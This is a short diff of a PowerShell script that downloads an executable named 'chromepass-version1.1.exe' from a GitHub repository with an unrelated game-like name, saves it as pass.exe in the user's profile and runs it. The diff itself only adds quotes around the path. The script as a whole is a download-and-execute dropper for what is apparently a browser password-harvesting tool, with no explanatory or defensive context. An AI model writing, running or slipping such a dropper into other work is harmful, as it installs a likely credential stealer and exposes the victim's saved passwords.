@@ -3,4 +3,4 @@ cd $env:userprofile
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 (new-object System.Net.WebClient).DownloadFile("https://github.com/TJDjchao/Ballance-JS/blob/master/chromepass-version1.1.exe?raw=true","$env:USERPROFILE\pass.exe")
 $path=$env:USERPROFILE+'\pass.exe'
-Start-Process -FilePath $path 
+Start-Process -FilePath "$path" 
